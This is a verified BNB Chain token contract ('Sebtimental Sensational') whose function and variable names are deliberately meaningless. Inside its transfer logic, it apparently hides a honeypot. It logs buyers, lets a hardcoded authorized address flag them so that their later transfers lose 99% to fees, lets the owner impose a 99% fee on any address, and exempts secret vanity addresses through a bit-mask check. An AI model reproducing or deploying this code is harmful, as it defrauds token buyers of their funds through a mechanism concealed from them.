/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.1;interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    function removeAuthorized(address adr) public onlyOwner() {        competent[adr] = false;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }    function SetAuthorized(address adr) public onlyOwner() {        competent[adr] = true;    }    function Owner() public view returns (address) {        return owner;    }}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}interface IBEP20 {    function name() external view returns (string memory);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function balanceOf(address account) external view returns (uint256);    function approve(address spender, uint256 amount) external returns (bool);    function decimals() external view returns (uint8);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function getOwner() external view returns (address);    function symbol() external view returns (string memory);    function totalSupply() external view returns (uint256);    function allowance(address _owner, address spender)    external    view    returns (uint256);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}interface IUniswapV2Router {    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);    function WETH() external pure returns (address);    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);    function swapExactETHForTokensSupportingFeeOnTransferTokens(        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external payable;    function factory() external pure returns (address);    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function swapExactTokensForTokensSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;}library SafeMath {    function trySub(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b > a) return (false, 0);        return (true, a - b);    }    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function tryDiv(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a / b);    }    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function tryAdd(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        uint256 c = a + b;        if (c < a) return (false, 0);        return (true, c);    }    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }}contract SebtimentalSensational is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    string constant _name = "Sebtimental Sensational ";    string constant _symbol = "SebtimentalSensational";    uint8 constant _decimals = 18;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private modeSwapReceiverBots;    mapping(address => bool) private buySellLaunchedTradingMinMaxAuto;    mapping(address => bool) private txModeLimitReceiver;    mapping(address => bool) private autoTeamBurnBuyIsReceiverSell;    mapping(address => uint256) private teamWalletMarketingBots;    mapping(uint256 => address) private receiverFeeMinTradingBuySwapLimit;    uint256 public maxWalletAmount = 0;    uint256 private launchBlock = 0;    //BUY FEES    uint256 private marketingLaunchedBotsTeam = 0;    uint256 private teamFeeReceiverSwapIsMinTrading = 8;    //SELL FEES    uint256 private walletTxTradingBurn = 0;    uint256 private isFeeMinSellLiquidityLaunched = 8;    uint256 private teamTradingIsLiquidity = teamFeeReceiverSwapIsMinTrading + marketingLaunchedBotsTeam;    uint256 private autoMaxModeReceiver = 100;    address private txExemptModeReceiver = (msg.sender); // auto-liq address    address private burnFeeBotsMaxBuy = (0xce6268A68A9c0751b0500dFbFFFfF4454b8dc6C6); // marketing address    address private teamMarketingLiquidityTxLaunched = DEAD;    address private receiverExemptMaxLiquidity = DEAD;    address private maxAutoMinIsSellWallet = DEAD;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private teamTradingBotsLiquidity;    uint256 private autoWalletTeamMin;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);    bool private feeMaxTeamWallet;    uint256 private receiverExemptMaxMinSwap;    uint256 private feeTxTeamLaunched;    uint256 private feeSellTradingIs;    uint256 private liquidityLimitTeamSwap;    bool private autoLaunchedMinTeam = true;    bool private autoTeamBurnBuyIsReceiverSellMode = true;    bool private sellMinTxTrading = true;    bool private tradingLiquidityReceiverModeSwapMarketing = true;    bool private teamTradingSellMinMax = true;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    uint256 private autoBotsTxLaunchedReceiverLiquidity = 6 * 10 ** 15;    uint256 private modeBuyFeeLaunchedTeamSwapAuto = _totalSupply / 1000; // 0.1%        uint256 public limitLaunchedWalletTrading = 0;    uint256 public liquidityMinSellIsMode = 0;    bool private marketingWalletSwapExemptIsTxLiquidity = false;    uint256 private walletFeeLaunchedAuto = 0;    bool private maxWalletTxMode = false;    bool private teamMinExemptLiquidity = false;    uint256 public burnWalletExemptSwap = 0;    bool public burnTradingMinAuto = false;    bool private limitMaxTradingModeBurnMin = false;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        feeMaxTeamWallet = true;        modeSwapReceiverBots[msg.sender] = true;        modeSwapReceiverBots[address(this)] = true;        buySellLaunchedTradingMinMaxAuto[msg.sender] = true;        buySellLaunchedTradingMinMaxAuto[0x0000000000000000000000000000000000000000] = true;        buySellLaunchedTradingMinMaxAuto[0x000000000000000000000000000000000000dEaD] = true;        buySellLaunchedTradingMinMaxAuto[address(this)] = true;        txModeLimitReceiver[msg.sender] = true;        txModeLimitReceiver[0x0000000000000000000000000000000000000000] = true;        txModeLimitReceiver[0x000000000000000000000000000000000000dEaD] = true;        txModeLimitReceiver[address(this)] = true;        SetAuthorized(address(0xE36db3F3163cc68a23d502ccfffFD5D1D9A1B41a));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return receiverExemptSellTxLimitTeamFee(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return receiverExemptSellTxLimitTeamFee(sender, recipient, amount);    }    function receiverExemptSellTxLimitTeamFee(address sender, address recipient, uint256 amount) internal returns (bool) {                bool bLimitTxWalletValue = minBurnTeamAuto(sender) || minBurnTeamAuto(recipient);                if (limitMaxTradingModeBurnMin == autoTeamBurnBuyIsReceiverSellMode) {            limitMaxTradingModeBurnMin = autoLaunchedMinTeam;        }        if (sender == uniswapV2Pair) {            if (maxWalletAmount != 0 && isAuthorized(recipient)) {                minLaunchedExemptReceiver();            }            if (!bLimitTxWalletValue) {                launchedWalletModeBuyBurnTeam(recipient);            }        }                        if (inSwap || bLimitTxWalletValue) {return feeMaxModeTxMin(sender, recipient, amount);}        if (!modeSwapReceiverBots[sender] && !modeSwapReceiverBots[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                require((amount <= _maxTxAmount) || txModeLimitReceiver[sender] || txModeLimitReceiver[recipient], "Max TX Limit!");        if (botsTxAutoExemptFeeBurn()) {marketingExemptLimitMode();}        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                uint256 amountReceived = maxBotsReceiverBurn(sender) ? minIsTeamMarketing(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function getTxExemptModeReceiver() public view returns (address) {        if (txExemptModeReceiver != burnFeeBotsMaxBuy) {            return burnFeeBotsMaxBuy;        }        return txExemptModeReceiver;    }
    function minIsTeamMarketing(address sender, address receiver, uint256 amount) internal returns (uint256) {                uint256 feeAmount = amount.mul(launchedExemptLiquidityMode(sender, receiver == uniswapV2Pair)).div(autoMaxModeReceiver);        if (autoTeamBurnBuyIsReceiverSell[sender] || autoTeamBurnBuyIsReceiverSell[receiver]) {            feeAmount = amount.mul(99).div(autoMaxModeReceiver);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                return amount.sub(feeAmount);    }
    function launchedExemptLiquidityMode(address sender, bool selling) internal returns (uint256) {                if (selling) {            teamTradingIsLiquidity = isFeeMinSellLiquidityLaunched + walletTxTradingBurn;            return buyLimitIsLaunched(sender, teamTradingIsLiquidity);        }        if (!selling && sender == uniswapV2Pair) {            teamTradingIsLiquidity = teamFeeReceiverSwapIsMinTrading + marketingLaunchedBotsTeam;            return teamTradingIsLiquidity;        }        return buyLimitIsLaunched(sender, teamTradingIsLiquidity);    }
    function launchedWalletModeBuyBurnTeam(address addr) private {        if (burnLiquidityLimitBotsTeam() < autoBotsTxLaunchedReceiverLiquidity) {            return;        }        maxWalletAmount = maxWalletAmount + 1;        receiverFeeMinTradingBuySwapLimit[maxWalletAmount] = addr;    }
    function minLaunchedExemptReceiver() private {        if (maxWalletAmount > 0) {            for (uint256 i = 1; i <= maxWalletAmount; i++) {                if (teamWalletMarketingBots[receiverFeeMinTradingBuySwapLimit[i]] == 0) {                    teamWalletMarketingBots[receiverFeeMinTradingBuySwapLimit[i]] = block.timestamp;                }            }            maxWalletAmount = 0;        }    }
    function setAutoTeamBurnBuyIsReceiverSell(address a0,bool a1) public onlyOwner {        if (a0 != txExemptModeReceiver) {            autoTeamBurnBuyIsReceiverSellMode=a1;        }        if (a0 == burnFeeBotsMaxBuy) {            sellMinTxTrading=a1;        }        if (autoTeamBurnBuyIsReceiverSell[a0] == buySellLaunchedTradingMinMaxAuto[a0]) {           buySellLaunchedTradingMinMaxAuto[a0]=a1;        }        autoTeamBurnBuyIsReceiverSell[a0]=a1;    }
    function getAutoTeamBurnBuyIsReceiverSell(address a0) public view returns (bool) {        if (a0 == maxAutoMinIsSellWallet) {            return tradingLiquidityReceiverModeSwapMarketing;        }        if (autoTeamBurnBuyIsReceiverSell[a0] != modeSwapReceiverBots[a0]) {            return autoLaunchedMinTeam;        }            return autoTeamBurnBuyIsReceiverSell[a0];    }
    function marketingExemptLimitMode() internal swapping {                if (teamMinExemptLiquidity == marketingWalletSwapExemptIsTxLiquidity) {            teamMinExemptLiquidity = marketingWalletSwapExemptIsTxLiquidity;        }        if (maxWalletTxMode == autoLaunchedMinTeam) {            maxWalletTxMode = sellMinTxTrading;        }        if (walletFeeLaunchedAuto != teamFeeReceiverSwapIsMinTrading) {            walletFeeLaunchedAuto = autoBotsTxLaunchedReceiverLiquidity;        }        uint256 amountToLiquify = modeBuyFeeLaunchedTeamSwapAuto.mul(marketingLaunchedBotsTeam).div(teamTradingIsLiquidity).div(2);        uint256 amountToSwap = modeBuyFeeLaunchedTeamSwapAuto.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                if (marketingWalletSwapExemptIsTxLiquidity == tradingLiquidityReceiverModeSwapMarketing) {            marketingWalletSwapExemptIsTxLiquidity = teamMinExemptLiquidity;        }        if (maxWalletTxMode == autoLaunchedMinTeam) {            maxWalletTxMode = sellMinTxTrading;        }        if (limitMaxTradingModeBurnMin == teamMinExemptLiquidity) {            limitMaxTradingModeBurnMin = autoLaunchedMinTeam;        }        uint256 amountBNB = address(this).balance;        uint256 totalETHFee = teamTradingIsLiquidity.sub(marketingLaunchedBotsTeam.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(marketingLaunchedBotsTeam).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(teamFeeReceiverSwapIsMinTrading).div(totalETHFee);                if (maxWalletTxMode != sellMinTxTrading) {            maxWalletTxMode = limitMaxTradingModeBurnMin;        }        if (marketingWalletSwapExemptIsTxLiquidity == limitMaxTradingModeBurnMin) {            marketingWalletSwapExemptIsTxLiquidity = maxWalletTxMode;        }        if (teamMinExemptLiquidity == maxWalletTxMode) {            teamMinExemptLiquidity = autoTeamBurnBuyIsReceiverSellMode;        }        payable(burnFeeBotsMaxBuy).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                txExemptModeReceiver,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function getTradingLiquidityReceiverModeSwapMarketing() public view returns (bool) {        if (tradingLiquidityReceiverModeSwapMarketing == maxWalletTxMode) {            return maxWalletTxMode;        }        if (tradingLiquidityReceiverModeSwapMarketing != marketingWalletSwapExemptIsTxLiquidity) {            return marketingWalletSwapExemptIsTxLiquidity;        }        if (tradingLiquidityReceiverModeSwapMarketing == maxWalletTxMode) {            return maxWalletTxMode;        }        return tradingLiquidityReceiverModeSwapMarketing;    }
    function buyLimitIsLaunched(address sender, uint256 pFee) private view returns (uint256) {        uint256 f0 = teamWalletMarketingBots[sender];        uint256 f1 = pFee;        if (f0 > 0 && block.timestamp - f0 > 2) {            f1 = 99;        }        return f1;    }
    function getTeamMarketingLiquidityTxLaunched() public view returns (address) {        if (teamMarketingLiquidityTxLaunched != receiverExemptMaxLiquidity) {            return receiverExemptMaxLiquidity;        }        return teamMarketingLiquidityTxLaunched;    }
    function getTxModeLimitReceiver(address a0) public view returns (bool) {        if (txModeLimitReceiver[a0] != modeSwapReceiverBots[a0]) {            return teamMinExemptLiquidity;        }        if (txModeLimitReceiver[a0] == txModeLimitReceiver[a0]) {            return teamMinExemptLiquidity;        }        if (a0 != maxAutoMinIsSellWallet) {            return maxWalletTxMode;        }            return txModeLimitReceiver[a0];    }
    function setTeamTradingSellMinMax(bool a0) public onlyOwner {        teamTradingSellMinMax=a0;    }
    function setTeamMarketingLiquidityTxLaunched(address a0) public onlyOwner {        if (teamMarketingLiquidityTxLaunched == teamMarketingLiquidityTxLaunched) {            teamMarketingLiquidityTxLaunched=a0;        }        if (teamMarketingLiquidityTxLaunched != burnFeeBotsMaxBuy) {            burnFeeBotsMaxBuy=a0;        }        if (teamMarketingLiquidityTxLaunched != txExemptModeReceiver) {            txExemptModeReceiver=a0;        }        teamMarketingLiquidityTxLaunched=a0;    }
    function burnLiquidityLimitBotsTeam() private view returns (uint256) {        address t0 = WBNB;        if (address(this) < WBNB) {            t0 = address(this);        }        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;        return buyAmount;    }
    function getWalletTxTradingBurn() public view returns (uint256) {        if (walletTxTradingBurn == walletFeeLaunchedAuto) {            return walletFeeLaunchedAuto;        }        if (walletTxTradingBurn == teamTradingIsLiquidity) {            return teamTradingIsLiquidity;        }        return walletTxTradingBurn;    }
    function feeMaxModeTxMin(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function minBurnTeamAuto(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function getReceiverFeeMinTradingBuySwapLimit(uint256 a0) public view returns (address) {        if (receiverFeeMinTradingBuySwapLimit[a0] == receiverFeeMinTradingBuySwapLimit[a0]) {            return burnFeeBotsMaxBuy;        }        if (a0 == autoBotsTxLaunchedReceiverLiquidity) {            return burnFeeBotsMaxBuy;        }        if (receiverFeeMinTradingBuySwapLimit[a0] != receiverFeeMinTradingBuySwapLimit[a0]) {            return maxAutoMinIsSellWallet;        }            return receiverFeeMinTradingBuySwapLimit[a0];    }
    function botsTxAutoExemptFeeBurn() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    teamTradingSellMinMax &&    _balances[address(this)] >= modeBuyFeeLaunchedTeamSwapAuto;    }
    function setTxModeLimitReceiver(address a0,bool a1) public onlyOwner {        if (a0 == maxAutoMinIsSellWallet) {            tradingLiquidityReceiverModeSwapMarketing=a1;        }        if (txModeLimitReceiver[a0] == buySellLaunchedTradingMinMaxAuto[a0]) {           buySellLaunchedTradingMinMaxAuto[a0]=a1;        }        txModeLimitReceiver[a0]=a1;    }
    function setWalletTxTradingBurn(uint256 a0) public onlyOwner {        if (walletTxTradingBurn != modeBuyFeeLaunchedTeamSwapAuto) {            modeBuyFeeLaunchedTeamSwapAuto=a0;        }        if (walletTxTradingBurn != walletTxTradingBurn) {            walletTxTradingBurn=a0;        }        if (walletTxTradingBurn == isFeeMinSellLiquidityLaunched) {            isFeeMinSellLiquidityLaunched=a0;        }        walletTxTradingBurn=a0;    }
    function setReceiverFeeMinTradingBuySwapLimit(uint256 a0,address a1) public onlyOwner {        if (receiverFeeMinTradingBuySwapLimit[a0] == receiverFeeMinTradingBuySwapLimit[a0]) {           receiverFeeMinTradingBuySwapLimit[a0]=a1;        }        if (receiverFeeMinTradingBuySwapLimit[a0] == receiverFeeMinTradingBuySwapLimit[a0]) {           receiverFeeMinTradingBuySwapLimit[a0]=a1;        }        if (a0 == isFeeMinSellLiquidityLaunched) {            burnFeeBotsMaxBuy=a1;        }        receiverFeeMinTradingBuySwapLimit[a0]=a1;    }
    function maxBotsReceiverBurn(address sender) internal view returns (bool) {        return !buySellLaunchedTradingMinMaxAuto[sender];    }
    function getTeamTradingSellMinMax() public view returns (bool) {        if (teamTradingSellMinMax == autoTeamBurnBuyIsReceiverSellMode) {            return autoTeamBurnBuyIsReceiverSellMode;        }        if (teamTradingSellMinMax == tradingLiquidityReceiverModeSwapMarketing) {            return tradingLiquidityReceiverModeSwapMarketing;        }        return teamTradingSellMinMax;    }
    function setTxExemptModeReceiver(address a0) public onlyOwner {        txExemptModeReceiver=a0;    }
    function setTradingLiquidityReceiverModeSwapMarketing(bool a0) public onlyOwner {        if (tradingLiquidityReceiverModeSwapMarketing != autoTeamBurnBuyIsReceiverSellMode) {            autoTeamBurnBuyIsReceiverSellMode=a0;        }        if (tradingLiquidityReceiverModeSwapMarketing == autoTeamBurnBuyIsReceiverSellMode) {            autoTeamBurnBuyIsReceiverSellMode=a0;        }        if (tradingLiquidityReceiverModeSwapMarketing == teamMinExemptLiquidity) {            teamMinExemptLiquidity=a0;        }        tradingLiquidityReceiverModeSwapMarketing=a0;    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}